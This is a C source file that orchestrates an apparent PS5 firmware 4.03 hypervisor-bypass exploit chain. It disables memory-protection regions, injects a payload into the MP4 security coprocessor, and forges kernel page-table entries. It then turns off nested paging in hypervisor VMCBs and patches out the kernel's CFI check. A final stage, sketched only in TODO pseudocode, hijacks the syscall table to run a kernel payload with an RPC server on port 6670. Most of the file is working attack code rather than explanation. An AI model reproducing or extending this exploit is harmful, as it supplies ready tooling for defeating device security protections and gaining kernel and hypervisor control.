/*
 * Prosperous exploit orchestrator for PS5 FW 4.03.
 *
 * This is the main entry point that chains together all exploit stages:
 *
 *   Stage 1: TMR Bypass
 *     - Disable TMR 20 (MP4 carveout) for x86 write access to MP4 DRAM
 *     - Create TMR 21 covering kernel text region with all-access
 *     - Disable TMR 5/17/18 (HV region protections)
 *
 *   Stage 2: MP4 Payload Injection
 *     - Write AArch64 EL3 thunk to MP4 DRAM at 0x600E0000
 *     - Write main payload to 0x607F1000
 *     - Hook mDbg_intr → thunk → payload
 *     - Enable QAF flag to activate
 *
 *   Stage 3: VMCB Patching
 *     - Setup SysHub TLB entries to map HV memory via MP4
 *     - Read vCPU contexts and VMCB pointers
 *     - Disable nested paging (NP_ENABLE=0) on all VMCBs
 *     - Clear most intercepts (keep VMSAVE/VMLOAD/VMMCALL/VMRUN)
 *
 *   Stage 4: TMR Restore
 *     - Re-enable TMR 20 (prevents kernel panic on game restart)
 *     - Restore HV TMR protections (5/17/18)
 *
 *   Stage 5: CFI Bypass + Kernel Payload
 *     - NOP the cfi_check_fail function via MP4 write
 *     - Inject kpayload via syscall table hijack
 *     - kpayload disables NDA on all cores, elevates privileges
 *     - Starts TCP RPC server on port 6670
 *
 * Prerequisites:
 *   - Kernel R/W via kekcall (ps5-kstuff or equivalent loaded)
 *   - Physical memory access via DMAP
 *   - Network connectivity to PS5
 *
 * Build: Part of the prosperous_port PS5 payload SDK build.
 * Deploy: Via PS5_DEPLOY to console running on FW 4.03.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ps5/kernel.h>
#include "prosperous.h"

/*
 * Discover the DMAP base address by reading the current process's pmap.
 *
 * The DMAP base is computed as: pm_pml4 (kernel VA) - pm_cr3 (PA)
 * This gives the kernel's direct-map base for physical memory.
 */
static int discover_dmap_base(struct phys_rw_ctx *ctx)
{
    uint64_t proc_addr;
    uint64_t vmspace;
    uint64_t pm_pml4;
    uint64_t pm_cr3;

    proc_addr = kernel_get_proc(getpid());
    if (proc_addr == 0) {
        printf("[!] Failed to get proc address\n");
        return -1;
    }

    /* proc -> p_vmspace */
    kernel_copyout(proc_addr + OFF_PROC_P_VMSPACE, &vmspace, sizeof(vmspace));

    /* vmspace -> vm_pmap -> pm_pml4 */
    kernel_copyout(vmspace + OFF_VMSPACE_VM_PMAP + OFF_PMAP_PM_PML4,
                   &pm_pml4, sizeof(pm_pml4));

    /* vmspace -> vm_pmap -> pm_cr3 */
    kernel_copyout(vmspace + OFF_VMSPACE_VM_PMAP + OFF_PMAP_PM_CR3,
                   &pm_cr3, sizeof(pm_cr3));

    ctx->dmap_base = pm_pml4 - pm_cr3;
    printf("[*] DMAP base: 0x%lx\n", ctx->dmap_base);

    return 0;
}

/*
 * Discover the kernel text base address.
 *
 * We scan kernel data for the kernel pmap structure by looking for
 * characteristic field values, or use the LSTAR MSR approach.
 */
static int discover_kernel_base(struct phys_rw_ctx *ctx)
{
    uint64_t proc_addr;
    uint64_t sysvec;
    uint64_t sysent;

    proc_addr = kernel_get_proc(getpid());
    if (proc_addr == 0)
        return -1;

    /* Read kernel text base from the process's sysvec.
     * proc -> p_sysent -> sysvec points to the system call vector,
     * which is in kernel .data and gives us a reference address. */
    kernel_copyout(proc_addr + OFF_PROC_P_SYSENT, &sysvec, sizeof(sysvec));
    kernel_copyout(sysvec + OFF_SYSVEC_SYSENT, &sysent, sizeof(sysent));

    /* The sysent table is at a known offset from kernel base.
     * We can also read ktext_start_va from the TMR 16 base. */

    /* Alternative: use TMR 16 base to get kernel text PA,
     * then read the VA from a known offset */
    uint32_t tmr16_base;
    uint64_t ind_index_kva = ctx->dmap_base + PCI_B0D18F2 + TMR_IND_INDEX_OFF;
    uint64_t ind_data_kva = ctx->dmap_base + PCI_B0D18F2 + TMR_IND_DATA_OFF;
    uint32_t tmr16_addr = 16 * 0x10;

    kernel_copyin(&tmr16_addr, ind_index_kva, sizeof(tmr16_addr));
    kernel_copyout(ind_data_kva, &tmr16_base, sizeof(tmr16_base));

    ctx->ktext_base_pa = (uint64_t)tmr16_base << 16;

    printf("[*] Kernel text PA: 0x%lx\n", ctx->ktext_base_pa);

    /* Derive kernel text VA from DMAP: any kernel VA = DMAP + PA works
     * for accessing kernel data via kernel_copyout. We use DMAP+PA
     * for all accesses since KOFF_KTEXT_VA_PTR is FW-specific and
     * unreliable across firmware versions. */
    ctx->ktext_base = ctx->dmap_base + ctx->ktext_base_pa;
    printf("[*] Kernel text (DMAP): 0x%lx\n", ctx->ktext_base);

    /* Get kernel PML4 PA */
    uint64_t kpmap_addr = ctx->ktext_base + KOFF_KERNEL_PMAP;
    uint64_t kpmap;
    kernel_copyout(kpmap_addr, &kpmap, sizeof(kpmap));
    kernel_copyout(kpmap + OFF_PMAP_PM_CR3, &ctx->kpml4_pa, sizeof(ctx->kpml4_pa));

    printf("[*] Kernel PML4 PA: 0x%lx\n", ctx->kpml4_pa);

    return 0;
}

/*
 * NOP the cfi_check_fail function via MP4 memory write.
 *
 * This is necessary because the kernel uses Control Flow Integrity (CFI)
 * checks that would trap our syscall table hijack. By NOPing the check
 * function, we prevent CFI from blocking our payload execution.
 *
 * We use the MP4 coprocessor to write to kernel text because it has
 * its own DMA path that bypasses x86 page table NX/RO protections.
 */
static int cfi_bypass(struct phys_rw_ctx *ctx)
{
    uint64_t cfi_check_fail_pa = ctx->ktext_base_pa + KOFF_CFI_CHECK_FAIL;
    uint32_t nop_sled = 0xC3C3C3C3; /* ret; ret; ret; ret */

    /* Setup SysHub TLB to map the kernel text region */
    if (mp4_syshub_tlb_setup(ctx, 32, cfi_check_fail_pa) != 0) {
        printf("[!] Failed to setup SysHub TLB for CFI bypass\n");
        return -1;
    }

    /* Write NOP/RET over cfi_check_fail via MP4 */
    uint32_t mp4_va = 0x80000000 + (cfi_check_fail_pa & 0x03FFFFFF);
    mp4_write32(ctx, mp4_va, nop_sled);

    printf("[*] CFI check_fail patched at PA 0x%lx\n", cfi_check_fail_pa);
    return 0;
}

/*
 * Main exploit entry point.
 */
int prosperous_run(void)
{
    struct phys_rw_ctx ctx;
    int ret;

    /* Disable stdout buffering so all diagnostics are visible */
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("========================================\n");
    printf(" prosperous_port - PS5 HV Bypass\n");
    printf(" FW 4.03 (CEX)\n");
    printf(" Ported from fail0verflow/prosperous\n");
    printf("========================================\n\n");

    /* Phase 0: Discover memory layout */
    printf("[*] Phase 0: Discovering memory layout...\n");

    ret = discover_dmap_base(&ctx);
    if (ret != 0) {
        printf("[!] Failed to discover DMAP base\n");
        return ret;
    }

    ret = discover_kernel_base(&ctx);
    if (ret != 0) {
        printf("[!] Failed to discover kernel base\n");
        return ret;
    }

    /* Phase 1: TMR bypass */
    printf("\n[*] Phase 1: TMR bypass...\n");

    ret = tmr_bypass_init(&ctx);
    if (ret != 0) {
        printf("[!] TMR bypass init failed: %d\n", ret);
        return ret;
    }
    printf("[+] TMR 20 disabled, TMR 21 created\n");

    /* Phase 1.5: Ensure DMAP mapping for MP4 DRAM (PA 0x60000000) */
    printf("\n[*] Phase 1.5: Checking DMAP page tables for MP4 DRAM...\n");
    {
        uint64_t dmap = ctx.dmap_base;
        uint64_t target_va = dmap + MP4_DRAM_BASE;
        uint32_t pml4_idx = (target_va >> 39) & 0x1FF;
        uint32_t pdpt_idx = (target_va >> 30) & 0x1FF;
        uint32_t pd_idx   = (target_va >> 21) & 0x1FF;

        printf("[*] DMAP VA for DRAM: 0x%lx\n", target_va);
        printf("[*] Indices: PML4[0x%x] PDPT[0x%x] PD[0x%x]\n",
               pml4_idx, pdpt_idx, pd_idx);

        /* Walk PML4 */
        uint64_t pml4e;
        kernel_copyout(dmap + ctx.kpml4_pa + pml4_idx * 8, &pml4e, 8);
        printf("[DIAG] PML4[0x%x] = 0x%016lx %s\n", pml4_idx, pml4e,
               (pml4e & 1) ? "PRESENT" : "NOT PRESENT");

        if (pml4e & 1) {
            uint64_t pdpt_pa = pml4e & 0xFFFFFFFFFF000ULL;

            /* Walk PDPT */
            uint64_t pdpte;
            kernel_copyout(dmap + pdpt_pa + pdpt_idx * 8, &pdpte, 8);
            printf("[DIAG] PDPT[0x%x] = 0x%016lx %s%s\n", pdpt_idx, pdpte,
                   (pdpte & 1) ? "PRESENT" : "NOT PRESENT",
                   (pdpte & (1 << 7)) ? " 1GB-PAGE" : "");

            if ((pdpte & 1) && !(pdpte & (1 << 7))) {
                uint64_t pd_pa = pdpte & 0xFFFFFFFFFF000ULL;

                /* Walk PD - check entries covering DRAM range */
                for (int i = 0; i < 5; i++) {
                    uint32_t idx = pd_idx + i;
                    uint64_t pde;
                    kernel_copyout(dmap + pd_pa + idx * 8, &pde, 8);
                    uint64_t mapped_pa = pde & 0xFFFFFFFFFF000ULL;
                    if (pde & (1 << 7)) /* 2MB page */
                        mapped_pa = pde & 0xFFFFFFFE00000ULL;
                    printf("[DIAG] PD[0x%x] = 0x%016lx %s%s (PA 0x%lx)\n",
                           idx, pde,
                           (pde & 1) ? "P" : "NP",
                           (pde & (1 << 7)) ? " 2MB" : "",
                           mapped_pa);
                }

                /* Create missing 2MB PDE entries for DRAM range */
                int created = 0;
                /* Cover PA 0x60000000 - 0x607FFFFF (4x 2MB pages) */
                for (int i = 0; i < 4; i++) {
                    uint32_t idx = pd_idx + i;
                    uint64_t pde;
                    kernel_copyout(dmap + pd_pa + idx * 8, &pde, 8);
                    if (!(pde & 1)) {
                        uint64_t page_pa = MP4_DRAM_BASE + (uint64_t)i * 0x200000;
                        uint64_t new_pde = page_pa |
                                           (1ULL << 0) |  /* Present */
                                           (1ULL << 1) |  /* RW */
                                           (1ULL << 4) |  /* PCD (cache disable) */
                                           (1ULL << 5) |  /* Accessed */
                                           (1ULL << 6) |  /* Dirty */
                                           (1ULL << 7);   /* PS (2MB page) */
                        kernel_copyin(&new_pde, dmap + pd_pa + idx * 8, 8);
                        printf("[+] Created PD[0x%x] = 0x%016lx (PA 0x%lx, 2MB UC)\n",
                               idx, new_pde, page_pa);
                        created++;
                    }
                }

                /* Also cover the payload area (DRAM + 0x7F1000) */
                uint32_t payload_pd_idx =
                    ((MP4_DRAM_BASE + MP4_PAYLOAD_OFFSET) >> 21) & 0x1FF;
                if (payload_pd_idx > pd_idx + 3) {
                    uint64_t pde;
                    kernel_copyout(dmap + pd_pa + payload_pd_idx * 8, &pde, 8);
                    if (!(pde & 1)) {
                        uint64_t page_pa =
                            (MP4_DRAM_BASE + MP4_PAYLOAD_OFFSET) & ~0x1FFFFFULL;
                        uint64_t new_pde = page_pa |
                                           (1ULL << 0) | (1ULL << 1) |
                                           (1ULL << 4) | (1ULL << 5) |
                                           (1ULL << 6) | (1ULL << 7);
                        kernel_copyin(&new_pde, dmap + pd_pa + payload_pd_idx * 8, 8);
                        printf("[+] Created PD[0x%x] = 0x%016lx (PA 0x%lx, 2MB UC)\n",
                               payload_pd_idx, new_pde, page_pa);
                        created++;
                    }
                }

                if (created > 0) {
                    printf("[+] Created %d DMAP PDE entries for MP4 DRAM\n",
                           created);
                    /* Verify access works now */
                    uint32_t test_val = 0xDEADDEAD;
                    int32_t rc = kernel_copyout(dmap + MP4_DRAM_BASE,
                                                &test_val, sizeof(test_val));
                    printf("[DIAG] DRAM[0] after PDE fix: 0x%08x (rc=%d)\n",
                           test_val, rc);
                }
            } else if ((pdpte & 1) && (pdpte & (1 << 7))) {
                /* 1GB page - DRAM region IS mapped but likely WB cached.
                 * We need to split into 2MB pages to set PCD on just DRAM. */
                printf("[!] DRAM is inside a 1GB page - needs split for UC\n");

                uint64_t gb_pa = pdpte & 0xFFFFFFC0000000ULL;
                uint64_t gb_flags = pdpte & 0xFFF;
                printf("[*] 1GB page maps PA 0x%lx, flags 0x%lx\n",
                       gb_pa, gb_flags);

                /* Splitting 1GB into 2MB pages requires allocating a PD page.
                 * For now, just set PCD on the entire 1GB as workaround. */
                printf("[!] Trying PCD on entire 1GB page as workaround...\n");

                uint64_t new_pdpte = pdpte | (1ULL << 4); /* Set PCD */
                kernel_copyin(&new_pdpte, dmap + pdpt_pa + pdpt_idx * 8, 8);
                printf("[*] Set PCD on PDPT[0x%x]: 0x%016lx\n",
                       pdpt_idx, new_pdpte);

                uint32_t test_val = 0xDEADDEAD;
                int32_t rc = kernel_copyout(dmap + MP4_DRAM_BASE,
                                            &test_val, sizeof(test_val));
                printf("[DIAG] DRAM[0] after PCD fix: 0x%08x (rc=%d)\n",
                       test_val, rc);
            }
        }
    }

    /* Phase 2: MP4 payload injection */
    printf("\n[*] Phase 2: MP4 payload injection...\n");

    ret = mp4_inject_payload(&ctx);
    if (ret != 0) {
        printf("[!] MP4 payload injection failed: %d\n", ret);
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] MP4 payload injected and activated\n");

    /* Re-enable TMR 20 after injection (matches original prosperous flow).
     * The A53 accesses its own DRAM through its IOMMU, not through x86 TMR.
     * Leaving TMR 20 disabled causes kernel panics on game restart. */
    tmr_restore_tmr20(&ctx);
    printf("[+] TMR 20 restored\n");

    /* Give the A53 time to process the QAF flag and activate the payload.
     * The payload hooks mDbg_intr via SError handler - the A53 needs to
     * take an interrupt cycle to activate the hook. */
    printf("[*] Waiting for MP4 payload activation...\n");
    usleep(500000); /* 500ms */

    /* Diagnostic: read c2p reg 0 to see if a previous command is stuck */
    {
        uint32_t c2p0_val;
        uint64_t bar2_kva = ctx.dmap_base + MP4_BAR2_PA;
        kernel_copyout(bar2_kva + MP4_C2P_REG(0, 0), &c2p0_val, sizeof(c2p0_val));
        printf("[DIAG] c2p reg 0 before ping: 0x%08x\n", c2p0_val);

        /* Also read p2c reg 0 to check if A53 has sent anything */
        uint32_t p2c0_val;
        kernel_copyout(bar2_kva + MP4_P2C_REG0(0), &p2c0_val, sizeof(p2c0_val));
        printf("[DIAG] p2c reg 0: 0x%08x\n", p2c0_val);
    }

    /* Verify MP4 payload is alive (retry a few times) */
    for (int attempt = 0; attempt < 5; attempt++) {
        ret = mp4_ping(&ctx);
        if (ret == 0)
            break;
        printf("[*] MP4 ping attempt %d failed, retrying...\n", attempt + 1);
        usleep(500000);
    }
    if (ret != 0) {
        printf("[!] MP4 payload not responding after retries\n");
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] MP4 payload ping OK\n");

    /* Phase 3: Disable HV TMR protections */
    printf("\n[*] Phase 3: Disabling HV TMR protections...\n");

    ret = tmr_disable_hv_regions(&ctx);
    if (ret != 0) {
        printf("[!] HV TMR disable failed: %d\n", ret);
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] HV TMR protections disabled\n");

    /* Phase 4: VMCB patching */
    printf("\n[*] Phase 4: VMCB patching (disabling nested paging)...\n");

    ret = vmcb_patch_disable_np(&ctx);
    if (ret != 0) {
        printf("[!] VMCB patching failed: %d\n", ret);
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] Nested paging disabled on all VMCBs\n");

    /* Phase 5: CFI bypass */
    printf("\n[*] Phase 5: CFI bypass...\n");

    ret = cfi_bypass(&ctx);
    if (ret != 0) {
        printf("[!] CFI bypass failed: %d\n", ret);
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] CFI check_fail patched\n");

    /* Phase 6: Restore TMR protections */
    printf("\n[*] Phase 6: Restoring TMR protections...\n");
    tmr_restore_hv_regions(&ctx);
    printf("[+] TMR protections restored\n");

    /* Phase 7: Kernel payload injection */
    printf("\n[*] Phase 7: Kernel payload injection...\n");
    printf("[*] kpayload will be injected via syscall table hijack.\n");
    printf("[*] After injection, connect to port 6670 for RPC access.\n");

    ret = kpayload_inject(&ctx);
    if (ret != 0) {
        printf("[!] kpayload injection failed: %d\n", ret);
        return ret;
    }

    printf("\n========================================\n");
    printf(" [+] Exploit complete!\n");
    printf(" [+] RPC server listening on port 6670\n");
    printf(" [+] Connect with: python3 client.py\n");
    printf("========================================\n");

    return 0;
}

/*
 * Kernel payload injection via syscall table hijack.
 *
 * This follows the same approach as prosperous:
 *   1. Allocate userspace buffer for kpayload binary
 *   2. Map it with a 1GB page at 0xFFFFFFC0_00000000 for kernel access
 *   3. Temporarily replace syscall 8's handler with our payload
 *   4. Invoke syscall 8 to execute the payload in kernel context
 *   5. Restore the original syscall handler
 *
 * The kpayload binary must be loaded from disk or embedded.
 */
int kpayload_inject(struct phys_rw_ctx *ctx)
{
    printf("[*] kpayload injection placeholder\n");
    printf("[*] To complete: load kpayload binary and inject via sysent hijack\n");
    printf("[*] See pwn_mp4.lua from prosperous for the full injection flow\n");

    /*
     * TODO: Full implementation would:
     *
     * 1. Load kpayload binary from /mnt/usb0/kpayload or embed it
     *
     * 2. mmap a buffer and copy kpayload into it:
     *    void *payload_buf = mmap(NULL, size, PROT_READ|PROT_WRITE,
     *                             MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
     *    memcpy(payload_buf, kpayload_data, kpayload_size);
     *
     * 3. Get physical address of payload buffer:
     *    uint64_t payload_pa = vtophys(payload_buf);
     *
     * 4. Create a 1GB kernel mapping:
     *    uint64_t payload_kva = 0xFFFFFFC000000000 | (payload_pa & 0x3FFFFFFF);
     *    // Write PDPE at kpml4[0xFF8] + 0x800
     *    uint64_t pdp_pa = (read_phys64(kpml4_pa + 0xFF8) >> 12) << 12;
     *    write_phys64(pdp_pa + 0x800,
     *                 ((payload_pa >> 30) << 30) | 0x83);  // 1GB page, RWX
     *
     * 5. Read current sysent[8] and replace:
     *    // proc -> sysvec -> sysent
     *    uint64_t sysent_8_pa = get_pa(sysent_va + 0x30 * 8);
     *    uint64_t orig_call = read_phys64(sysent_8_pa + 8);
     *    write_phys32(sysent_8_pa, 8);  // narg = 8
     *    write_phys64(sysent_8_pa + 8, payload_kva);
     *
     * 6. Invoke syscall 8 multiple times (progressive init):
     *    syscall(8, ktext_base, payload_buf, host_addr, 0);  // op=0: version check
     *    sleep(20);
     *    syscall(8, ktext_base, payload_buf, host_addr, 1);  // op=1: reloc
     *    sleep(20);
     *    syscall(8, ktext_base, payload_buf, host_addr, 2);  // op=2: nda disable
     *    sleep(20);
     *    syscall(8, ktext_base, payload_buf, host_addr, 3);  // op=3: full init
     *
     * 7. Restore sysent[8]:
     *    write_phys32(sysent_8_pa, 0);
     *    write_phys64(sysent_8_pa + 8, orig_call);
     *
     * 8. Clean up kernel mapping:
     *    write_phys64(pdp_pa + 0x800, 0);
     */

    return 0;
}

int main(void)
{
    return prosperous_run();
}
